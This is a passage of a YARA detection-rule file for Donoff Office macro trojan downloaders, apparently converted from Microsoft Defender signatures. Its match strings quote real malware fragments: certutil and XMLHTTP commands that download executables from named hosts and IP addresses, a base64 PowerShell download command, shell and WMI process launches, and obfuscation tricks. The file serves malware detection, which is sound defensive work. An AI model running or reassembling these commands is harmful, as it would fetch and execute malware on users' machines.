        $x_1_1 = {50 72 69 76 61 74 65 20 53 75 62 20 64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 [0-48] 2e 56 69 73 69 62 6c 65 20 3d 20 54 72 75 65 [0-48] 2e 56 69 73 69 62 6c 65 20 3d 20 54 72 75 65 [0-48] 2e 56 69 73 69 62 6c 65 20 3d 20 54 72 75 65 [0-48] 2e 56 69 73 69 62 6c 65 20 3d 20 54 72 75 65 [0-48] 2e 56 69 73 69 62 6c 65 20 3d 20 54 72 75 65 [0-48] 2e 56 69 73 69 62 6c 65 20 3d 20 54 72 75 65}  //weight: 1, accuracy: Low
        $x_1_2 = {27 25 5e 28 [0-16] 27 [0-16] 27 25 5e 28 [0-16] 27 [0-16] 27 25 5e 28 [0-16] 27 [0-16] 27 25 5e 28 [0-16] 27 [0-16] 27 25 5e 28 [0-16] 27 [0-16] 27 25 5e 28 [0-16] 2a 25}  //weight: 1, accuracy: Low
        $x_1_3 = {53 68 65 6c 6c 20 [0-16] 2e [0-16] 20 2b 20 [0-16] 2e [0-16] 20 2b 20 [0-16] 2e [0-16] 20 2b 20 [0-16] 2e [0-16] 20 2b 20 [0-16] 2e [0-16] 20 2b 20 [0-16] 2e [0-16] 20 2b 20 [0-16] 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BB_2147744897_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BB!MTB"
        threat_id = "2147744897"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "MsgBox decrypt(XOREncryption(" ascii //weight: 1
        $x_1_2 = "XOREncryption = XOREncryption & Chr(Asc(Mid(sKey, IIf(i Mod Len(sKey) <> 0, i Mod Len(sKey), Len(sKey)), 1)) Xor Asc(Mid(sStr, i, 1)))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SE_2147745315_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SE!MSR"
        threat_id = "2147745315"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".FolderExists(\"c:\\1\") = False" ascii //weight: 1
        $x_1_2 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 22 63 3a 5c 31 5c [0-10] 2e 63 6d 64 22 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 57 72 69 74 65 4c 69 6e 65 20 28 22 [0-100] 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 57 72 69 74 65 4c 69 6e 65 20 28 [0-15] 2e [0-10] 2e [0-10] 29}  //weight: 1, accuracy: Low
        $x_1_5 = ".WriteLine (\"break>%FolderVBS%\")" ascii //weight: 1
        $x_1_6 = {3d 20 43 72 65 61 74 65 50 72 6f 63 65 73 73 57 28 [0-2] 2c 20 53 74 72 50 74 72 28 22 63 3a 5c 31 5c [0-10] 2e 63 6d 64 22 29}  //weight: 1, accuracy: Low
        $x_1_7 = {49 66 20 4c 65 6e 28 [0-5] 28 44 65 6c 65 74 65 46 69 6c 65 29 29 20 3e 20 30 20 54 68 65 6e}  //weight: 1, accuracy: Low
        $x_1_8 = "Kill DeleteFile" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PA_2147746227_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PA!MSR"
        threat_id = "2147746227"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = "WScript.Shell" ascii //weight: 2
        $x_2_2 = "modJordanExcel.Save ActiveDocument" ascii //weight: 2
        $x_2_3 = {63 3a 5c 41 74 74 61 [0-2] 5c 6c 64 72 2e 65 78 65 27}  //weight: 2, accuracy: Low
        $x_2_4 = {68 74 74 70 [0-1] 3a 2f 2f [0-3] 2e [0-3] 2e [0-3] 2e [0-3] 2f 6c 64 72 2e 65 78 65}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_A_2147747816_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.A!MTB"
        threat_id = "2147747816"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "https://alexdepase.coach/wp-admin/Ic4ZVsh/@http://amiral.ga/wp-content/cUFTze5/" ascii //weight: 1
        $x_1_2 = "+ \".exe\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CS_2147749186_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CS!eml"
        threat_id = "2147749186"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "eml: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Set Wicmd = CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_2 = "Wicmd.CreateFolder \"C:\\ImgContent\\\"" ascii //weight: 1
        $x_1_3 = {47 61 6c 6c 65 72 79 35 39 2e 63 6d 64 22 23 00 22 43 3a 5c 49 6d 67 43 6f 6e 74 65 6e 74 5c}  //weight: 1, accuracy: Low
        $x_1_4 = {5c 57 72 69 74 65 4c 69 6e 65 73 2e 65 78 65 22 26 00 73 74 61 72 74 20 43 3a 5c 49 6d 67 43 6f 6e 74 65 6e 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SF_2147749417_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SF!MSR"
        threat_id = "2147749417"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 77 22 20 26 20 [0-8] 20 26 20 22 53 63 22 20 26 20}  //weight: 1, accuracy: Low
        $x_1_2 = {26 20 22 72 69 22 20 26 20 [0-8] 20 26 20 22 70 74 22 20 26 20 45 6d 70 74 79 20 26 20 22 2e 22 20 26 20 [0-8] 29 2c}  //weight: 1, accuracy: Low
        $x_1_3 = "= \"\"" ascii //weight: 1
        $x_1_4 = "= Empty" ascii //weight: 1
        $x_1_5 = {26 20 22 72 75 22 20 26 20 [0-8] 20 26 20 22 6e 22}  //weight: 1, accuracy: Low
        $x_1_6 = {26 20 22 73 68 22 20 26 20 [0-8] 20 26 20 22 65 6c 6c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CM_2147750046_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CM!eml"
        threat_id = "2147750046"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "eml: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub WritePayload()" ascii //weight: 1
        $x_1_2 = {23 50 61 79 4c 6f 61 64 46 69 6c 65 2c [0-5] 48 54 54 50 44 6f 77 6e 6c 6f 61 64}  //weight: 1, accuracy: Low
        $x_1_3 = {4d 69 64 28 [0-2] 6d 79 55 52 4c 2c 20 49 6e 53 74 72 52 65 76 28 [0-3] 6d 79 55 52 4c 2c 20 22}  //weight: 1, accuracy: Low
        $x_1_4 = {57 53 63 72 69 70 74 2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-3] 22 [0-5] 57 53 63 72 69 70 74 2e 53 68 65 6c 6c [0-5] 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {46 69 6c 65 2c [0-22] 57 73 68 53 68 65 6c 6c 2e 52 75 6e}  //weight: 1, accuracy: Low
        $x_1_6 = {53 68 65 6c 6c [0-4] 77 73 63 72 69 70 74 [0-31] 2e 76 62 73}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RK_2147750337_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RK!MTB"
        threat_id = "2147750337"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell (Ygbcj9)" ascii //weight: 1
        $x_1_2 = "ChrW(32) & ChrW(104) & ChrW(116) & ChrW(116) & ChrW(112) & ChrW(58) & ChrW(47) & ChrW(47) & ChrW(98) & ChrW(105)" ascii //weight: 1
        $x_1_3 = "ChrW(102) & ChrW(116) & ChrW(32) & ChrW(97) & ChrW(46) & ChrW(100) & ChrW(108) & ChrW(108) & ChrW(32) & ChrW(38)" ascii //weight: 1
        $x_1_4 = "AutoExec()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RK_2147750337_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RK!MTB"
        threat_id = "2147750337"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "14"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Dim stJ8Mgg As String" ascii //weight: 1
        $x_1_2 = "Dim RWuycQI As String" ascii //weight: 1
        $x_1_3 = "Dim Vp5IXDG As String" ascii //weight: 1
        $x_1_4 = "Dim Xobf3y As String" ascii //weight: 1
        $x_1_5 = "Dim waUWMh As String" ascii //weight: 1
        $x_1_6 = "Dim MxtvR81 As String" ascii //weight: 1
        $x_1_7 = "Dim xwZDLGo As String" ascii //weight: 1
        $x_1_8 = "Dim ZE2nbrz As String" ascii //weight: 1
        $x_1_9 = "Dim Ygbcj9 As String" ascii //weight: 1
        $x_5_10 = "Ygbcj9 = stJ8Mgg + RWuycQI + Vp5IXDG + Xobf3y + waUWMh + MxtvR81 + xwZDLGo + ZE2nbrz" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RB_2147750370_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RB!MTB"
        threat_id = "2147750370"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {43 61 6c 6c 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 52 75 6e 28 22 02 04 08 74 61 72 61 72 6f 73 6f 6c 61 72 65 22 2c 20 [0-8] 28 22 00 07 22 29 29}  //weight: 2, accuracy: Low
        $x_2_2 = {66 65 72 61 6c 6f 20 3d 20 70 65 6e 69 73 6f 6c 61 28 22 00 07 22 29 0d 0a 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 52 75 6e 20 22 6d 61 6c 75 6d 6f 72 65 22 2c 20 66 65 72 61 6c 6f}  //weight: 2, accuracy: Low
        $x_2_3 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 2e 52 75 6e ?? 02 09 08 73 69 6e 75 73 6f 69 64 65 73 66 61 72 7a 6f 73 6f 2c 20 76 62 48 69 64 65}  //weight: 2, accuracy: Low
        $x_2_4 = {50 75 62 6c 69 63 20 46 75 6e 63 74 69 6f 6e 20 74 61 72 61 28 70 61 63 69 66 69 63 6f 20 41 73 20 53 74 72 69 6e 67 29 0d 0a 20 20 53 68 65 6c 6c 20 70 61 63 69 66 69 63 6f 2c 20 30}  //weight: 2, accuracy: High
        $x_1_5 = {46 75 6e 63 74 69 6f 6e 20 [0-8] 28 [0-8] 20 41 73 20 53 74 72 69 6e 67 2c 20 4f 70 74 69 6f 6e 61 6c 20 [0-8] 20 41 73 20 49 6e 74 65 67 65 72 29 20 41 73 20 56 61 72 69 61 6e 74 0d 0a 20 20 20 20 00 20 3d 20 53 70 6c 69 74 28 4c 65 66 74 28 53 74 72 43 6f 6e 76 28 01 2c 20 76 62 55 6e 69 63 6f 64 65 29 2c 20 4c 65 6e 28 53 74 72 43 6f 6e 76 28 01 2c 20 76 62 55 6e 69 63 6f 64 65 29 29 20 2d 20 31 29 2c 20 76 62 4e 75 6c 6c 43 68 61 72 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            ((3 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_QF_2147750839_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.QF!MSR"
        threat_id = "2147750839"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Xxxwsxcxrixptx xx X/ex:xxxxXJxSCrxipxtx x\"\"x%x~xfxX0x" ascii //weight: 1
        $x_1_2 = {45 6e 76 69 72 6f 6e 28 [0-10] 28 22 20 00 41 50 50 20 00 44 41 54 41 20 00 22 29 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_QG_2147750987_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.QG!MTB"
        threat_id = "2147750987"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "S ocne- neddih elytswodniw- llehsrewop" ascii //weight: 1
        $x_1_2 = "GetObject(\"winmgmts:root\\cimv2:Win32_Process\")." ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RP_2147751002_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RP!MTB"
        threat_id = "2147751002"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=createobject(\"microsoft.xmlhttp\"):avar.open\"get\",\"https://paste.ee/r/rmx81" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RP_2147751002_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RP!MTB"
        threat_id = "2147751002"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=shell(\"cmd/ccertutil.exe-urlcache-split-f\"\"http://3.112.243.28/tun/7705221205.bat\"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_RP_2147751002_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.RP!MTB"
        threat_id = "2147751002"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://xoomer.virgilio.it/ludormio/download.htm" ascii //weight: 1
        $x_1_2 = "ExecuteCommand \"C:\\DiskDrive\\1\\Volume\\errorfix.bat" ascii //weight: 1
        $x_1_3 = "frmChessX.RootOLE" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_QH_2147751127_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.QH!MTB"
        threat_id = "2147751127"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cABvAHcAZQByAHMAaABlAGwAbAAgAC0AQwBvAG0AbQBhAG4AZAAgACIASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAaAB0AHQAcAA6AC8ALwAlAFUAVQBVAFUAJQAiACAALQBPAHUAdABGAGkAbABlACAAJABFAE4AVgA6AFUAcwBlAHIAUAByAG8AZgBpAGwAZQBcAGsAZQB5AHMALgBkAGwAbAAiAA==" ascii //weight: 1
        $x_1_2 = "Shell Replace" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AJK_2147751440_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AJK!MSR"
        threat_id = "2147751440"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "certutil.exe -urlcache -split -f \" + Chr(34) + \"h\" + \"t\" + \"tp\" + \":/\" + \"/def.nime.xyz:2095/sling/rwcore.exe\" + Chr(34) + \" %tmp%/t.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AJK_2147751440_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AJK!MSR"
        threat_id = "2147751440"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "xHttp.Open \"POST\", \"http://linda-callaghan.icu/Minkowski/brown" ascii //weight: 1
        $x_1_2 = "oStream.SaveToFile \"C:\\ProgramData\\IntegratedOffice.txt" ascii //weight: 1
        $x_1_3 = "BinaryStream.SaveToFile (\"C:\\ProgramData\\IntegratedOffice.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_QI_2147751464_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.QI!MTB"
        threat_id = "2147751464"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Function ssh2_poll Lib \"ssh2_poll.dll\"" ascii //weight: 1
        $x_1_2 = "ssh2_poll(\"abstract\", 5)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_EF_2147751622_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.EF!MTB"
        threat_id = "2147751622"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Set iuytrh = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = {52 65 70 6c 61 63 65 28 [0-15] 2c 20 22 [0-30] 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "lineText = singleLine.Range.Text" ascii //weight: 1
        $x_1_4 = {69 75 79 74 72 68 2e 52 75 6e 20 [0-15] 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PK_2147751640_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PK!MTB"
        threat_id = "2147751640"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {20 3d 20 52 65 70 6c 61 63 65 28 [0-54] 2c 20 22 [0-5] 22 2c 20 22 ?? 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {20 3d 20 52 65 70 6c 61 63 65 28 [0-54] 2c 20 22 [0-5] 22 2c 20 22 68 74 74 70 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 76 65 72 73 65 28 22 29 [0-255] 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = "Set objWMIService = GetObject(Reverse(\"2vmic\\toor\\.\\\\!}etanosrepmi=leveLnoitanosrepmi{:stmgmniw\"))" ascii //weight: 1
        $x_1_5 = "Set objProcess = objWMIService.Get(Reverse(\"ssecorP_23niW\"))" ascii //weight: 1
        $x_1_6 = {69 6e 74 52 65 74 75 72 6e 20 3d 20 6f 62 6a 50 72 6f 63 65 73 73 2e 43 72 65 61 74 65 28 52 65 70 6c 61 63 65 28 [0-54] 2c 20 22 [0-5] 22 2c 20 22 ?? 22 29 2c 20 4e 75 6c 6c 2c 20 6f 62 6a 43 6f 6e 66 69 67 2c 20 69 6e 74 50 72 6f 63 65 73 73 49 44 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_QJ_2147751792_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.QJ!MTB"
        threat_id = "2147751792"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "\"ss\" + \"ec\" + \"orP_\" + \"23niW\" + \":2\" + \"vmi\" + \"c\\t\" + \"oor:\" + \"stm\" + \"gmn\" + \"iw\"" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_QK_2147751911_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.QK!MTB"
        threat_id = "2147751911"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "\"Ws\" + \"cr\" + \"ipt\" + \".S\"" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AV_2147753850_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AV!MTB"
        threat_id = "2147753850"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "autoclose()" ascii //weight: 1
        $x_1_2 = "REtas = Environ(Teriol.Caption)" ascii //weight: 1
        $x_1_3 = "T2.T1" ascii //weight: 1
        $x_1_4 = "Shell \"cmd.exe /c\" & REtas & Teriol.Tag, 0" ascii //weight: 1
        $x_1_5 = "Herti = REtas & Teriol.Tag" ascii //weight: 1
        $x_1_6 = "Open Herti For Output As #1" ascii //weight: 1
        $x_1_7 = "Print #1, Teriol.Teriope" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_HZA_2147753895_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.HZA!MTB"
        threat_id = "2147753895"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\Users\\Public\\iuq24.vbs" ascii //weight: 1
        $x_1_2 = "C:\\Users\\Public\\qnn455.txt" ascii //weight: 1
        $x_1_3 = "CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_4 = "Excel\\Security\\VBAWarnings" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_AR_2147754075_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.AR!MTB"
        threat_id = "2147754075"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "gpj.1cn3rm329_p/ten.pot4pot.a//:sptth" ascii //weight: 1
        $x_1_2 = {53 74 72 52 65 76 65 72 73 65 28 [0-3] 65 78 65 2e [0-20] 5c 61 74 61 44 6d 61 72 67 6f 72 50 5c 3a 43}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
